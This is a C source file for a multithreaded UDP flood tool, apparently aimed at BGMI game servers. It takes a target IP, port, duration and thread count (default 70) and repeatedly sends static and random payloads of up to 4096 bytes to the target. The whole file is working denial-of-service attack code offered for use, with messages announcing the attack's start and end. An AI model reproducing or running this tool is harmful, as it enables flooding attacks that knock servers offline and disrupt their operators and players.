#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>

#define DEFAULT_THREADS 70
#define MAX_PAYLOAD_SIZE 4096

void usage() {
    printf("Usage: ./bgmi ip port time [threads]\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

struct payload_entry {
    const char *data;
    size_t length;
    int dynamic_size;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    unsigned char dynamic_payload[MAX_PAYLOAD_SIZE];
    FILE *urandom = fopen("/dev/urandom", "rb");

    struct payload_entry payloads[] = {
        // Static payloads
        { // Long UDP
            "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff"
            "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff"
            "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff"
            "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff"
            "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff"
            "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff",
            96, 0
        },
        // ... (other static payloads from previous version)

        // Random encrypted-like payloads
        {NULL, 512, 1},   // Medium encrypted payload
        {NULL, 1024, 1},  // Large encrypted payload
        {NULL, 2048, 1}, // Jumbo encrypted payload
        {NULL, 4096, 1}   // Maximum size payload
    };

    if (!urandom) {
        perror("Failed to open /dev/urandom");
        pthread_exit(NULL);
    }

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        fclose(urandom);
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads)/sizeof(payloads[0]); i++) {
            size_t send_size = payloads[i].length;
            const char *payload = payloads[i].data;

            if (payloads[i].dynamic_size) {
                // Generate new random payload for each request
                if (fread(dynamic_payload, 1, send_size, urandom) != send_size) {
                    perror("Failed to generate random payload");
                    fclose(urandom);
                    close(sock);
                    pthread_exit(NULL);
                }
                payload = (const char *)dynamic_payload;
            }

            if (sendto(sock, payload, send_size, 0,
                      (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                fclose(urandom);
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    fclose(urandom);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 4 || argc > 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = (argc == 5) ? atoi(argv[4]) : DEFAULT_THREADS;

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    for (int remaining_time = time; remaining_time > 0; remaining_time--) {
        printf("Time remaining: %d seconds\r", remaining_time);
        fflush(stdout);
        sleep(1);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("\nAttack finished\n");
    return 0;
}
